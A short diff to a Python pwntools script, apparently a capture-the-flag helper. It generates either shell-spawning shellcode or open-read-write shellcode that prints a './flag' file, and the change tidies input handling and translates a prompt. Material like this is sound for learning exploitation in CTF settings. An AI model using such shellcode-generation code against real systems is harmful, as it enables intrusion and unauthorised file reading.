@@ -11,12 +11,12 @@
 from pwn import *
 arch=input("arch? i386/amd64: ")
 context(log_level = 'debug', arch = arch[:-1], os = 'linux')
-choice=input("shell/orw: ")
+choice=input("shell/orw: ")[:-1]
 if choice=="shell":
     shellcode=asm(shellcraft.sh())
     print(shellcode)
 else:
-    mmap_addr = int(input("请输入16进制的读入地址: ")[:-1],16)
+    mmap_addr = int(input("hex addr: ")[:-1],16)
     shellcode = shellcraft.open('./flag')
     shellcode += shellcraft.read(3, mmap_addr, 0x30)
     shellcode += shellcraft.write(1, mmap_addr, 0x30)
